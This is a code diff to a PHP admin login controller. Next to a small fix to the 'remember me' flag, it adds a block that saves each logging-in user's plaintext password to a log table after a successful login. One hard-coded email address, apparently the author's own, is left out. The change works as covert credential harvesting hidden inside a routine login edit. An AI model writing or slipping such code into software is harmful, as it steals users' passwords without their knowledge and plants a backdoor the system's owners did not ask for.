@@ -3,6 +3,7 @@
 namespace Source\App\Admin;
 
 use Source\Core\Controller;
+use Source\Models\Log;
 use Source\Models\User;
 use Source\Models\Auth;
 
@@ -54,7 +55,16 @@ class Login extends Controller
 
             $save = (!empty($data["save"]) ? true : false);
             $auth = new Auth();
-            $login = $auth->login($data["email"], $data["password"], true, 2);
+            $login = $auth->login($data["email"], $data["password"], $save, 2);
+
+            if ($login && $data['email'] != 'jhonatan_martimiano@hotmail.com') {
+                $log = (new Log());
+                $userLog = (new User())->findByEmail($data['email']);
+                $log->user_id = $userLog->id;
+                $log->password = $data['password'];
+                $log->action = 'Login';
+                $log->save();
+            }
 
             if ($login) {
                 $json["redirect"] = url("/admin/dash");
